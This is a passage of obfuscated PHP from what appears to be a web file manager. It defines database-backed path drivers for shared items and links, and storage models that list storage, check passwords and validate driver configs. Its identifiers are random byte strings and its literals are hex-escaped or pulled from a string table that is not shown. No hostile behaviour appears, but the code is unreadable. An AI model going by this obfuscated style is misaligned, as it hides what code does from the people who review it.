copyFolderFromIO($İÖŸ…á, $İÌø , $³™¢ÛÎ‡, $–³áæû, $úËÜ‘ğÃ) { $Û•«ÑÉÎ = $this->model->copyFolderFromIO($İÖŸ…á, $İÌø , $³™¢ÛÎ‡, $–³áæû, $úËÜ‘ğÃ); return KodIO::make($Û•«ÑÉÎ); } public function isParentOf($Êñ÷ş£¶, $Ô†”‘µ§) { return $this->model->isParentOf($Êñ÷ş£¶, $Ô†”‘µ§); } public function mkfile($©ÎŸµ, $šÂ‚ñï‹ = '', $œƒ—¯ïî = REPEAT_RENAME) { $ÍÁ–€ =& $_SERVER[™¸œØ®Ü]; $êÃíÈ²² = $this->parse($©ÎŸµ); $©ÎŸµ = $êÃíÈ²²[$ÍÁ–€[477]]; for ($‹…ğåü = 0; $‹…ğåü < count($êÃíÈ²²[$ÍÁ–€[1441]]); $‹…ğåü++) { $¨â‚áöá = $êÃíÈ²²[$ÍÁ–€[1441]][$‹…ğåü]; if ($‹…ğåü == count($êÃíÈ²²[$ÍÁ–€[1441]]) - 1) { $©ÎŸµ = $this->model->mkfile($©ÎŸµ, $¨â‚áöá, $šÂ‚ñï‹, $œƒ—¯ïî); break; } $©ÎŸµ = $this->model->mkdir($©ÎŸµ, $¨â‚áöá, REPEAT_SKIP); } return $this->getPathOuter($©ÎŸµ); } public function mkdir($·œœ—×ˆ, $¯÷Ù¹±ã = REPEAT_SKIP) { $÷¼çáœÜ =& $_SERVER[™¸œØ®Ü]; $ş¦ü€‰Ü = $this->parse($·œœ—×ˆ); $·œœ—×ˆ = $ş¦ü€‰Ü[$÷¼çáœÜ[477]]; for ($ëÎˆí‡æ = 0; $ëÎˆí‡æ < count($ş¦ü€‰Ü[$÷¼çáœÜ[1441]]); $ëÎˆí‡æ++) { $Ç‰Î«ùˆ = $ş¦ü€‰Ü[$÷¼çáœÜ[1441]][$ëÎˆí‡æ]; $·œœ—×ˆ = $this->model->mkdir($·œœ—×ˆ, $Ç‰Î«ùˆ, $¯÷Ù¹±ã); } return $this->getPathOuter($·œœ—×ˆ); } public function copyFile($Ÿ¤½Êàâ, $ ŸŒ¼éû, $¤Ş·¦éø = REPEAT_REPLACE) { $×¿¶®¤€ =& $_SERVER[™¸œØ®Ü]; $œíæŒÊ = $this->parse($ ŸŒ¼éû); $¥Ì˜ÍÖ = $this->model->copy($Ÿ¤½Êàâ, $œíæŒÊ[$×¿¶®¤€[477]], $¤Ş·¦éø, $œíæŒÊ[$×¿¶®¤€[87]]); return $¥Ì˜ÍÖ ? $this->getPathOuter($¥Ì˜ÍÖ) : !1; } public function moveFile($æ£´¸Ç, $õÅ©ŠÖ¯, $Ÿ®ş§˜ş = REPEAT_REPLACE) { $×Ç¦ì€û =& $_SERVER[™¸œØ®Ü]; $’Šïû˜° = $this->parse($õÅ©ŠÖ¯); $¹ˆá¹• = $this->model->move($æ£´¸Ç, $’Šïû˜°[$×Ç¦ì€û[477]], $Ÿ®ş§˜ş, $’Šïû˜°[$×Ç¦ì€û[87]]); return $¹ˆá¹• ? $this->getPathOuter($¹ˆá¹•) : !1; } public function copy($³óÅˆÕª, $œ¦ÉÙ™ª, $°ˆ¾ó‚Ÿ = REPEAT_REPLACE, $ø¤ÅŒ = false) { $Û¡ëİÑØ = $this->parse($œ¦ÉÙ™ª); $‘ºâ³Ç = $this->model->copy($³óÅˆÕª, $Û¡ëİÑØ[$_SERVER[™¸œØ®Ü][477]], $°ˆ¾ó‚Ÿ, $ø¤ÅŒ); return $‘ºâ³Ç ? $this->getPathOuter($‘ºâ³Ç) : !1; } public function moveSameAllow() { } public function move($öÑ¸¨Ëô, $Ó†™õ, $À…Œâ³ = REPEAT_REPLACE, $Å°“–°è = false) { $óÂõ¹Õë = $this->parse($Ó†™õ); $íç’ôçÛ = $this->model->move($öÑ¸¨Ëô, $óÂõ¹Õë[$_SERVER[™¸œØ®Ü][477]], $À…Œâ³, $Å°“–°è); return $íç’ôçÛ ? $this->getPathOuter($íç’ôçÛ) : !1; } public function remove($­Ü±–’§, $‘¦‚§”Ë = true) { return $this->model->remove($­Ü±–’§, $‘¦‚§”Ë); } public function rename($Ã€›é›, $šğ €®Û) { $£Œ†ÆŞ = $this->model->rename($Ã€›é›, $šğ €®Û); return $£Œ†ÆŞ ? $this->getPathOuter($Ã€›é›) : $£Œ†ÆŞ; } public function size($¿ŸÜëĞ) { $ÕÎ›„Û½ = $this->infoSimple($¿ŸÜëĞ); return $ÕÎ›„Û½ ? $ÕÎ›„Û½[$_SERVER[™¸œØ®Ü][79]] : 0; } public function infoSimple($ÊÖõßĞÊ) { return $this->model->sourceInfo($ÊÖõßĞÊ); } public function info($¨¡ÚéÁÍ) { return $this->infoParse($¨¡ÚéÁÍ); } public function infoAuth($ÅÊ•ÛÒî) { return $this->infoParse($ÅÊ•ÛÒî, !1, !0); } public function infoWithChildren($£Ó¯‰¢æ) { return $this->infoParse($£Ó¯‰¢æ, !0); } protected function infoParse($ ÌŞøĞ, $èü¥§ö» = false, $Ê‹…… – = false) { if (!$èü¥§ö») { return $this->model->pathInfo($ ÌŞøĞ, $Ê‹…… –); } return $this->model->pathInfoMore($ ÌŞøĞ); } public function infoFullSimple($íÆ¯ÈÜ) { $àÔÇƒ„… =& $_SERVER[™¸œØ®Ü]; $Ä¨ò¬š† = explode($àÔÇƒ„…[8], $íÆ¯ÈÜ); $¸—•¿·ğ = implode($àÔÇƒ„…[8], array_splice($Ä¨ò¬š†, 1)); return $this->model->pathInfoByPath($Ä¨ò¬š†[0], $¸—•¿·ğ); } public function infoFull($ßÈ”“ùƒ) { $™Ê·ˆÆ€ = $this->infoFullSimple($ßÈ”“ùƒ); return is_array($™Ê·ˆÆ€) ? $this->model->pathInfo($™Ê·ˆÆ€[$_SERVER[™¸œØ®Ü][193]]) : !1; } public function hashSimple($ÕïØ¯èŒ) { $òÄÌåò =& $_SERVER[™¸œØ®Ü]; $Ã¦î†Â = $this->infoWithChildren($ÕïØ¯èŒ); return $Ã¦î†Â[$òÄÌåò[170]][$òÄÌåò[679]]; } public function hashMd5($ÍÒ¯¾Ã) { $ã­çùŸ =& $_SERVER[™¸œØ®Ü]; $•Íöˆ¸Õ = $this->infoWithChildren($ÍÒ¯¾Ã); return $•Íöˆ¸Õ[$ã­çùŸ[170]][$ã­çùŸ[551]]; } public function exist($ë¼Æ ÎÓ) { $€ƒÙ—ï‘ =& $_SERVER[™¸œØ®Ü]; $ÇÛ¡İ¸¾ = $this->parse($ë¼Æ ÎÓ); if (!$ÇÛ¡İ¸¾[$€ƒÙ—ï‘[87]]) { return $this->isFile($ë¼Æ ÎÓ) || $this->isFolder($ë¼Æ ÎÓ); } $½¢·êÍ¹ = array($€ƒÙ—ï‘[479] => $ÇÛ¡İ¸¾[$€ƒÙ—ï‘[477]], $€ƒÙ—ï‘[32] => $ÇÛ¡İ¸¾[$€ƒÙ—ï‘[87]]); $¹¶Şæ» = $this->model->where($½¢·êÍ¹)->find(); return $¹¶Şæ» ? !0 : !1; } public function isFile($úˆó¾Ù) { $¡Äï§İ¬ =& $_SERVER[™¸œØ®Ü]; $‚ÈßàÑ¢ = $this->infoSimple($úˆó¾Ù); return $‚ÈßàÑ¢ && $‚ÈßàÑ¢[$¡Äï§İ¬[487]] == $¡Äï§İ¬[230] ? !0 : !1; } public function isFolder($ß‰‰†–°) { $Şó¹­«ş =& $_SERVER[™¸œØ®Ü]; $ì‡Ô¡ë‡ = $this->infoSimple($ß‰‰†–°); return $ì‡Ô¡ë‡ && $ì‡Ô¡ë‡[$Şó¹­«ş[487]] == $Şó¹­«ş[91] ? !0 : !1; } public function listPath($ì àÄ­Ò, $í§®–ı = false) { $£‘÷ñı° =& $_SERVER[™¸œØ®Ü]; if ($ì àÄ­Ò == $£‘÷ñı°[12]) { return !1; } $ÅÀªæÔÉ = array($£‘÷ñı°[479] => $ì àÄ­Ò); if ($í§®–ı) { return $this->model->listSource($ÅÀªæÔÉ, -1); } return $this->model->listSource($ÅÀªæÔÉ); } public function has($Å¯“¹€Ó, $“Ğ›˜  = false, $ï÷ïˆò› = null) { $ŞòƒßË =& $_SERVER[™¸œØ®Ü]; $Ö˜Ïèğø = $this->infoWithChildren($Å¯“¹€Ó); if ($“Ğ›˜ ) { return array($ŞòƒßË[242] => $Ö˜Ïèğø[$ŞòƒßË[242]], $ŞòƒßË[241] => $Ö˜Ïèğø[$ŞòƒßË[241]]); } return $ï÷ïˆò› ? $Ö˜Ïèğø[$ŞòƒßË[242]] : $Ö˜Ïèğø[$ŞòƒßË[241]]; } public function listAll($á¾‡€â¶) { $Æ—‹Ç©ç = IO::info($this->pathParse[$_SERVER[™¸œØ®Ü][87]]); if (!$Æ—‹Ç©ç) { return array(); } return $this->model->listAll($á¾‡€â¶); } public function getContent($ë¤¬×¼Ã) { return $this->model->getContent($ë¤¬×¼Ã); } public function setContent($¶Â’˜³÷, $ÓåËøÙ‘ = '') { return $this->model->setContent($¶Â’˜³÷, $ÓåËøÙ‘); } public function fileSubstr($ÄøçØ¯ç, $Éµ¢ÉˆÌ, $İûÜÚæÇ) { return $this->model->fileSubstr($ÄøçØ¯ç, $Éµ¢ÉˆÌ, $İûÜÚæÇ); } public function download($Ÿñ­Ûø÷, $è½¸‹æº = '') { $¤‰Ëˆ»Ã = get_path_father($è½¸‹æº); $Ğş„³™Â = get_path_this($è½¸‹æº); $›ä˜ôşª = $this->model->fileInfoGet($Ÿñ­Ûø÷); $æôºèî¤ = IO::copy($›ä˜ôşª[$_SERVER[™¸œØ®Ü][87]], $¤‰Ëˆ»Ã, !1, $Ğş„³™Â); return $æôºèî¤; } public function setModifyTime($“òíóİ›, $Ó±¸¸« = '') { $Ä´©ó«ª =& $_SERVER[™¸œØ®Ü]; if (!$“òíóİ›) { return; } $this->model->where(array($Ä´©ó«ª[493] => $“òíóİ›))->save(array($Ä´©ó«ª[88] => $Ó±¸¸«)); } public function upload($³¡ÊŞº, $¬ïøì¾, $éÊ¥±ºŸ = false, $è“À¦ Ú = REPEAT_REPLACE) { $á…Àà²ı =& $_SERVER[™¸œØ®Ü]; $©§×Á = $this->parse($³¡ÊŞº); $Ãß™‰šÂ = $this->model->addFile($©§×Á[$á…Àà²ı[477]], $¬ïøì¾, $©§×Á[$á…Àà²ı[87]], $éÊ¥±ºŸ, $è“À¦ Ú); return $this->getPathOuter($Ãß™‰šÂ); } public function uploadFileByID($´¶¯¼Š, $ŞÆú’î, $«ÎÏØÊ) { $¯¼À·Í =& $_SERVER[™¸œØ®Ü]; $ãó®Ÿ’­ = $this->parse($´¶¯¼Š); $Ú£¢İÖ‘ = $this->model->addFileByFileID($ãó®Ÿ’­[$¯¼À·Í[477]], $ŞÆú’î, $ãó®Ÿ’­[$¯¼À·Í[87]], $«ÎÏØÊ); return $this->getPathOuter($Ú£¢İÖ‘); } public function addFileByRemote($‹‡Ÿ™³¨, $ÍÏ˜ù»Ë, $¤ÁïÙ÷¡ = array(), $¶ÏÊ° = '', $Ï¶İş§¹) { $ñÄŸÂßƒ =& $_SERVER[™¸œØ®Ü]; $ÆÁØÙÌ» = $this->parse($‹‡Ÿ™³¨); $¶ÏÊ° = empty($¶ÏÊ°) ? $ÆÁØÙÌ»[$ñÄŸÂßƒ[87]] : $¶ÏÊ°; $ÓáòÆ‹© = $this->model->addFileByRemote($ÆÁØÙÌ»[$ñÄŸÂßƒ[477]], $ÍÏ˜ù»Ë, $¶ÏÊ°, $¤ÁïÙ÷¡, $Ï¶İş§¹); return $this->getPathOuter($ÓáòÆ‹©); } public function uploadLink($ĞÙ˜ì›ï, $ÒáÊšö¥ = 0) { $²ÕùÚÔ™ =& $_SERVER[™¸œØ®Ü]; $ˆ¯Ğîé‚ = $this->parse($ĞÙ˜ì›ï); $ª‘¼ÏÅ = _get($GLOBALS[$²ÕùÚÔ™[7]], $²ÕùÚÔ™[1442]); $Şº¢ç–’ = _get($GLOBALS[$²ÕùÚÔ™[7]], $²ÕùÚÔ™[1443]); $ĞÙ˜ì›ï = Model($²ÕùÚÔ™[681])->createFileName($ˆ¯Ğîé‚[$²ÕùÚÔ™[87]], $ª‘¼ÏÅ, $Şº¢ç–’); return IO::uploadLink($ĞÙ˜ì›ï, $ÒáÊšö¥); } public function fileNameAuto($ıìËÉ²µ, $¢•Íó¾Õ, $§ê‰È« = REPEAT_REPLACE, $ñÏ†ù» = false) { return $this->model->fileNameAuto($ıìËÉ²µ, $¢•Íó¾Õ, $§ê‰È«, $ñÏ†ù»); } public function fileNameExist($“ÖŸ¶¸Ô, $İÜÀ‰çÁ) { return $this->model->fileNameExist($“ÖŸ¶¸Ô, $İÜÀ‰çÁ); } protected function _fileOut($²˜ÇÃ…, $İ²¢È… = false, $åƒËÎä = false, $‹ÎÑƒê¾ = '', $š‹éä¢€ = false) { $¥á³©ò¿ =& $_SERVER[™¸œØ®Ü]; $‚’¬î­â = $this->model->sourceInfo($²˜ÇÃ…); if ($‚’¬î­â[$¥á³©ò¿[487]] == $¥á³©ò¿[91]) { header($¥á³©ò¿[1444]); die; } $ŞÂ‰ßÏ¢ = $this->model->fileInfoGet($²˜ÇÃ…); $‹ÎÑƒê¾ = $ŞÂ‰ßÏ¢[$¥á³©ò¿[551]] ? $ŞÂ‰ßÏ¢[$¥á³©ò¿[551]] : $‹ÎÑƒê¾; $×ÓèÀ°ú = isset($GLOBALS[$¥á³©ò¿[182]]) && is_array($GLOBALS[$¥á³©ò¿[182]]) ? $GLOBALS[$¥á³©ò¿[182]][$¥á³©ò¿[32]] : $‚’¬î­â[$¥á³©ò¿[32]]; if ($š‹éä¢€) { return IO::fileOutServer($ŞÂ‰ßÏ¢[$¥á³©ò¿[87]], $İ²¢È…, $×ÓèÀ°ú, $‹ÎÑƒê¾); } IO::fileOut($ŞÂ‰ßÏ¢[$¥á³©ò¿[87]], $İ²¢È…, $×ÓèÀ°ú, $‹ÎÑƒê¾); } public function fileOut($§Ã—¨Ï¬, $µĞ™ Şº = false, $¸ÎÁıÙó = false, $˜¼Àğ–­ = '') { $this->_fileOut($§Ã—¨Ï¬, $µĞ™ Şº, $¸ÎÁıÙó, $˜¼Àğ–­); } public function fileOutServer($ŒÍô Õë, $´¨›Úä´ = false, $ˆªÃ÷Ù· = false, $ÛÒö›îÈ = '') { $this->_fileOut($ŒÍô Õë, $´¨›Úä´, $ˆªÃ÷Ù·, $ÛÒö›îÈ, !0); } protected function _fileOutImage($”ÏøÊ×Í, $²õáÊ¢Û = 250) { $½ä„ÆéØ =& $_SERVER[™¸œØ®Ü]; $Íîí–úÖ = $this->model->pathInfo($”ÏøÊ×Í); if ($Íîí–úÖ[$½ä„ÆéØ[487]] == $½ä„ÆéØ[91]) { show_json($½ä„ÆéØ[1445] . $”ÏøÊ×Í, !1); } $÷—î£¡Á = $this->model->fileInfoGet($”ÏøÊ×Í); $Íîí–úÖ[$½ä„ÆéØ[183]] = $÷—î£¡Á[$½ä„ÆéØ[87]]; $GLOBALS[$½ä„ÆéØ[182]] = $Íîí–úÖ; IO::fileOutImage($÷—î£¡Á[$½ä„ÆéØ[87]], $²õáÊ¢Û); } public function fileOutImage($şø«®£, $”Ğ®ø¾š = 250) { $this->_fileOutImage($şø«®£, $”Ğ®ø¾š); } public function fileOutImageServer($Á¢ßÏÕ, $÷…›ÇÖ = 250) { $this->_fileOutImage($Á¢ßÏÕ, $÷…›ÇÖ); } public function link($Ç„ÓÉœú, $†£¹‚èÖ = '') { $³ƒÀçƒ‰ = $this->model->fileInfoGet($Ç„ÓÉœú); return IO::link($³ƒÀçƒ‰[$_SERVER[™¸œØ®Ü][87]], $†£¹‚èÖ); } protected function parse($®ƒÜÙœ) { $ºİ˜† =& $_SERVER[™¸œØ®Ü]; if (strstr($®ƒÜÙœ, $ºİ˜†[8]) === !1) { return array($ºİ˜†[495] => intval($®ƒÜÙœ), $ºİ˜†[87] => $ºİ˜†[12], $ºİ˜†[1441] => array()); } $ó¶Ö‡Ñ­ = explode($ºİ˜†[8], trim($®ƒÜÙœ, $ºİ˜†[8])); if (count($ó¶Ö‡Ñ­) < 2) { show_tips(clear_html($®ƒÜÙœ) . $ºİ˜†[1446]); } return array($ºİ˜†[495] => intval($ó¶Ö‡Ñ­[0]), $ºİ˜†[87] => $ó¶Ö‡Ñ­[1], $ºİ˜†[1441] => array_slice($ó¶Ö‡Ñ­, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ßºö¨äû) { $this->pathParse = $ßºö¨äû; $this->model = Model($_SERVER[™¸œØ®Ü][1440]); } public function getPathOuter($í±æøÄ§) { $£ÛÂñ„„ =& $_SERVER[™¸œØ®Ü]; if (!$í±æøÄ§) { return $í±æøÄ§; } $ËöÉ’°É = $this->parse($í±æøÄ§); return trim(KodIO::makeShare($this->pathParse[$£ÛÂñ„„[477]], $ËöÉ’°É[$£ÛÂñ„„[477]]), $£ÛÂñ„„[8]); } protected function infoParse($î¬ÚÕœ‘, $ˆ’¨Şß£ = false, $Æ¼ë’“æ = false) { $ô¼éŸı¥ =& $_SERVER[™¸œØ®Ü]; $öÂïÍæÈ = $this->pathParse[$ô¼éŸı¥[477]]; $Ã¹’æêÁ = trim($this->pathParse[$ô¼éŸı¥[1269]], $ô¼éŸı¥[8]); return Action($ô¼éŸı¥[1447])->sharePathInfo($öÂïÍæÈ, $Ã¹’æêÁ, $ˆ’¨Şß£); } public function infoFull($Ï¸¶ÑÒÀ) { $¡ÁıÁîì =& $_SERVER[™¸œØ®Ü]; $êçºïÖß = explode($¡ÁıÁîì[8], trim($Ï¸¶ÑÒÀ, $¡ÁıÁîì[8])); if (count($êçºïÖß) > 1) { $¹êøÍ«Â = implode($¡ÁıÁîì[8], array_splice($êçºïÖß, 1)); $şÌ™Û•Í = $this->model->pathInfoByPath($êçºïÖß[0], $¹êøÍ«Â); if (!$şÌ™Û•Í) { return !1; } $this->pathParse[$¡ÁıÁîì[1269]] = $şÌ™Û•Í[$¡ÁıÁîì[193]]; } return $this->infoParse($Ï¸¶ÑÒÀ); } public function listAll($Æš‹è¥Ä) { $ßõçŒöØ =& $_SERVER[™¸œØ®Ü]; $êù·¿ï = IO::info($this->pathParse[$ßõçŒöØ[87]]); if (!$êù·¿ï) { return array(); } $Á˜ÒÍßö = $this->model->listAll($Æš‹è¥Ä); $êâš­é™ = Model($ßõçŒöØ[671])->getInfo($êù·¿ï[$ßõçŒöØ[672]]); foreach ($Á˜ÒÍßö as &$¼¦Íêü²) { check_abort(); $¼¦Íêü²[$ßõçŒöØ[90]] = Action($ßõçŒöØ[1447])->_shareItemeParse($¼¦Íêü²[$ßõçŒöØ[90]], $êâš­é™); } unset($¼¦Íêü²); return $Á˜ÒÍßö; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÒÄ½™”Ë) { $this->pathParse = $ÒÄ½™”Ë; $this->model = Model($_SERVER[™¸œØ®Ü][1440]); } protected function infoParse($é÷õ—•, $²¿úÛÎ¨ = false, $°é£‡†Ö = false) { $ÚºÈë¦¥ =& $_SERVER[™¸œØ®Ü]; return Action($ÚºÈë¦¥[1275])->sharePathInfo($this->pathParse[$ÚºÈë¦¥[87]], !0, $²¿úÛÎ¨); } public function listPath($àƒ§äüö, $Çëâ‚Š = false) { $Ùìüİ¹Œ =& $_SERVER[™¸œØ®Ü]; $Ì®œ°ñË = parent::listPath($àƒ§äüö, $Çëâ‚Š); if (!$Ì®œ°ñË) { return $Ì®œ°ñË; } if (is_array($Ì®œ°ñË[$Ùìüİ¹Œ[1448]])) { $Ì®œ°ñË[$Ùìüİ¹Œ[1448]] = Action($Ùìüİ¹Œ[1275])->shareItemInfo($Ì®œ°ñË[$Ùìüİ¹Œ[1448]]); } foreach ($Ì®œ°ñË as $•ÏÉè º => $¤Ğóê—) { if (!in_array($•ÏÉè º, array($Ùìüİ¹Œ[86], $Ùìüİ¹Œ[85]))) { continue; } foreach ($¤Ğóê— as $´Ğ˜’áæ => $¼ÄÃŒ) { $Ì®œ°ñË[$•ÏÉè º][$´Ğ˜’áæ] = Action($Ùìüİ¹Œ[1275])->shareItemInfo($¼ÄÃŒ); } } return $Ì®œ°ñË; } public function listAll($¯öŸîÁ) { $ØÊ•–äÌ =& $_SERVER[™¸œØ®Ü]; $ö®‘‚û = IO::info($this->pathParse[$ØÊ•–äÌ[87]]); if (!$ö®‘‚û) { return array(); } $Ã»àóÙ” = $this->model->listAll($¯öŸîÁ); foreach ($Ã»àóÙ” as &$¶¬ÒüÆì) { $¶¬ÒüÆì[$ØÊ•–äÌ[90]] = Action($ØÊ•–äÌ[1275])->shareItemInfo($¶¬ÒüÆì[$ØÊ•–äÌ[90]]); } unset($¶¬ÒüÆì); return $Ã»àóÙ”; } } goto Cìº²èÀÄ; fÓÏÖï¾: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\163\x6f\x75\x72\x63\x65\x53\x65\x63\x72\x65\x74\114\x69\x73\164"; public $field = array("\x73\x6f\165\x72\x63\x65\x49\x44", "\164\171\160\x65\x49\104", "\143\162\x65\x61\164\145\x55\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x73\164\157\x72\141\147\x65\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\151\x7a\x65\x4d\141\x78", "\x73\x79\x73\x74\x65\x6d", "\x64\145\146\141\x75\x6c\164", "\x64\162\x69\166\145\x72", "\143\x6f\x6e\146\151\x67"); public function listData($¹î‹ˆº = false, $¥ššËÎµ = "\x6d\157\x64\151\x66\x79\124\x69\155\x65", $ á©‘ = false) { $²ªœ¢Í• =& $_SERVER[™¸œØ®Ü]; $ğÈ†Åó = parent::listData($¹î‹ˆº, $¥ššËÎµ, $ á©‘); if ($¹î‹ˆº) { return $ğÈ†Åó; } $˜¯ ˜º = array(); if ($GLOBALS[$²ªœ¢Í•[2333]]) { $˜¯ ˜º = $this->ioSizeUseGet(array_to_keyvalue($ğÈ†Åó, $²ªœ¢Í•[12], $²ªœ¢Í•[477])); } foreach ($ğÈ†Åó as $Î™µ½½ì => $ªó¶ş¿) { unset($ğÈ†Åó[$Î™µ½½ì][$²ªœ¢Í•[6]]); $ğÈ†Åó[$Î™µ½½ì][$²ªœ¢Í•[1984]] = isset($˜¯ ˜º[$ªó¶ş¿[$²ªœ¢Í•[477]]]) ? $˜¯ ˜º[$ªó¶ş¿[$²ªœ¢Í•[477]]] : 0; } return $ğÈ†Åó; } public function ioSizeUseGet($ŞÎá¶Í) { $´Äı²ğ‹ =& $_SERVER[™¸œØ®Ü]; if (!$ŞÎá¶Í) { return array(); } $µÁ¼íÄ = $´Äı²ğ‹[2334] . implode($´Äı²ğ‹[50], $ŞÎá¶Í); $ó¹µùØâ = Cache::get($µÁ¼íÄ); if ($ó¹µùØâ) { return $ó¹µùØâ; } $´çÃ½çç = array($´Äı²ğ‹[908] => $´Äı²ğ‹[477], $´Äı²ğ‹[2335] => $´Äı²ğ‹[79]); $ÜòŞóí = array($´Äı²ğ‹[908] => array($´Äı²ğ‹[7], $ŞÎá¶Í)); $ó¹µùØâ = Model($´Äı²ğ‹[876])->field($´çÃ½çç)->where($ÜòŞóí)->group($´Äı²ğ‹[908])->select(); $ó¹µùØâ = array_to_keyvalue($ó¹µùØâ, $´Äı²ğ‹[477], $´Äı²ğ‹[79]); Cache::set($µÁ¼íÄ, $ó¹µùØâ, 600); return $ó¹µùØâ; } public function getConfig($øñÔˆÃá) { $åİãì = parent::listData($øñÔˆÃá); $¥»äı£ú = _get($åİãì, $_SERVER[™¸œØ®Ü][6], array()); if ($¥»äı£ú && !is_array($¥»äı£ú)) { $¥»äı£ú = json_decode($¥»äı£ú, !0); } return $¥»äı£ú; } public function update($”‘²ŸèÛ, $µê›Ôœ) { $Æ‘ŸçØä =& $_SERVER[™¸œØ®Ü]; $ÚÜ›àé = $µê›Ôœ[$Æ‘ŸçØä[32]]; $õ¬Ğ·ÅĞ = array_to_keyvalue(parent::listData(), $Æ‘ŸçØä[32]); if (isset($õ¬Ğ·ÅĞ[$ÚÜ›àé]) && $õ¬Ğ·ÅĞ[$ÚÜ›àé][$Æ‘ŸçØä[477]] != $”‘²ŸèÛ) { return !1; } $this->checkPwd($”‘²ŸèÛ, $µê›Ôœ); if (isset($µê›Ôœ[$Æ‘ŸçØä[2336]]) && $µê›Ôœ[$Æ‘ŸçØä[2336]] == $Æ‘ŸçØä[91]) { $this->checkConfig($µê›Ôœ); } unset($µê›Ôœ[$Æ‘ŸçØä[2336]]); $ë®´ï²ï = parent::update($”‘²ŸèÛ, $µê›Ôœ); if ($ë®´ï²ï && $µê›Ôœ[$Æ‘ŸçØä[37]]) { $Í†ÒÑàº = 0; foreach ($õ¬Ğ·ÅĞ as $™„¡ıÛ) { if ($™„¡ıÛ[$Æ‘ŸçØä[37]] && $™„¡ıÛ[$Æ‘ŸçØä[477]] != $”‘²ŸèÛ) { $Í†ÒÑàº = $™„¡ıÛ[$Æ‘ŸçØä[477]]; parent::update($™„¡ıÛ[$Æ‘ŸçØä[477]], array($Æ‘ŸçØä[37] => 0)); } } $this->updateBackup($”‘²ŸèÛ, $Í†ÒÑàº); } return $ë®´ï²ï; } public function add($·Áï°ä) { $µ®Œ“™ =& $_SERVER[™¸œØ®Ü]; $å¹â¯š· = array_to_keyvalue(parent::listData(), $µ®Œ“™[32]); if (isset($å¹â¯š·[$·Áï°ä[$µ®Œ“™[32]]])) { return !1; } $this->checkConfig($·Áï°ä); $Ä©è„ÜÑ = parent::insert($·Áï°ä); if ($Ä©è„ÜÑ && $·Áï°ä[$µ®Œ“™[37]]) { foreach ($å¹â¯š· as $‘ßø´¹) { if ($‘ßø´¹[$µ®Œ“™[37]]) { parent::update($‘ßø´¹[$µ®Œ“™[477]], array($µ®Œ“™[37] => 0)); } } } return $Ä©è„ÜÑ; } public function updateBackup($åòôüª», $óÇó‹¨Š) { $Èâó©± =& $_SERVER[™¸œØ®Ü]; if (!$óÇó‹¨Š) { return; } $œìû—ë = Model($Èâó©±[833])->config(); if ($œìû—ë[$Èâó©±[1764]] != $Èâó©±[91] || $œìû—ë[$Èâó©±[837]] != $óÇó‹¨Š) { return; } $šğğ·áá = Model($Èâó©±[855])->get($Èâó©±[862]); $šğğ·áá = json_decode($šğğ·áá, !0); if (!$šğğ·áá) { return; } $šğğ·áá[$Èâó©±[837]] = $åòôüª»; Model($Èâó©±[855])->set(array($Èâó©±[862] => $šğğ·áá)); } public function checkPwd($·è‘‡ˆ, &$­˜×Û÷ı) { $­ÚšÅ¶ğ =& $_SERVER[™¸œØ®Ü]; if (empty($­˜×Û÷ı[$­ÚšÅ¶ğ[6]])) { return; } $±˜Ë¸æ³ = $­˜×Û÷ı[$­ÚšÅ¶ğ[6]]; if (!is_array($±˜Ë¸æ³)) { $±˜Ë¸æ³ = json_decode($±˜Ë¸æ³, !0); } $¤¿ÄèŠ = $­ÚšÅ¶ğ[12]; $‘“Ô×ğˆ = array($­ÚšÅ¶ğ[2337], $­ÚšÅ¶ğ[2338], $­ÚšÅ¶ğ[985]); foreach ($‘“Ô×ğˆ as $úòš“) { if (isset($±˜Ë¸æ³[$úòš“])) { $¤¿ÄèŠ = $úòš“; break; } } if (!$¤¿ÄèŠ) { return; } $»íû…«Ó = $this->getConfig($·è‘‡ˆ); $Ò°ÅÅâ© = $»íû…«Ó[$¤¿ÄèŠ]; $¸‚ â©Œ = $±˜Ë¸æ³[$¤¿ÄèŠ]; if ($¸‚ â©Œ == str_repeat($­ÚšÅ¶ğ[222], strlen($Ò°ÅÅâ©))) { $±˜Ë¸æ³[$¤¿ÄèŠ] = $Ò°ÅÅâ©; $­˜×Û÷ı[$­ÚšÅ¶ğ[6]] = json_encode($±˜Ë¸æ³); } else { if ($¸‚ â©Œ != $Ò°ÅÅâ©) { $­˜×Û÷ı[$­ÚšÅ¶ğ[2336]] = $­ÚšÅ¶ğ[91]; } } } public function checkConfig(&$ûµªÊ…ñ, $¿ú¨ò·ı = false) { $Éƒ˜Ä¦¿ =& $_SERVER[™¸œØ®Ü]; $Ë¦Ëø¢³ = strtolower($ûµªÊ…ñ[$Éƒ˜Ä¦¿[98]]); $¹§Òœ‘î = $ûµªÊ…ñ[$Éƒ˜Ä¦¿[6]]; if (!is_array($¹§Òœ‘î)) { $¹§Òœ‘î = json_decode($¹§Òœ‘î, !0); } foreach ($¹§Òœ‘î as $¾ò¢¨Ò => $à€ËÃæ) { if (is_string($à€ËÃæ)) { $¹§Òœ‘î[$¾ò¢¨Ò] = trim($à€ËÃæ); } } $¹§Òœ‘î[$Éƒ˜Ä¦¿[2339]] = rand_string(6); $ËÂ¶´€ = $GLOBALS[$Éƒ˜Ä¦¿[6]][$Éƒ˜Ä¦¿[92]][$Éƒ˜Ä¦¿[916]]; $šª‘ş = isset($ËÂ¶´€[$Ë¦Ëø¢³]) ? $ËÂ¶´€[$Ë¦Ëø¢³] : ucfirst($Ë¦Ëø¢³); $àà¨ÏƒÂ = $Éƒ˜Ä¦¿[77] . $šª‘ş; if (!$šª‘ş || !class_exists($àà¨ÏƒÂ)) { if ($¿ú¨ò·ı) { return LNG($Éƒ˜Ä¦¿[2340]); } write_log(array($Éƒ˜Ä¦¿[2341], $ûµªÊ…ñ, get_caller_info()), $Éƒ˜Ä¦¿[215]); show_json(LNG($Éƒ˜Ä¦¿[2340]), !1, $ûµªÊ…ñ); } $¿î˜ä´Ç = new $àà¨ÏƒÂ($¹§Òœ‘î); $ç»³“® = rtrim($¹§Òœ‘î[$Éƒ˜Ä¦¿[1281]], $Éƒ˜Ä¦¿[8]) . $Éƒ˜Ä¦¿[8]; if (in_array($Ë¦Ëø¢³, $¿î˜ä´Ç->objectDriver)) { try { if 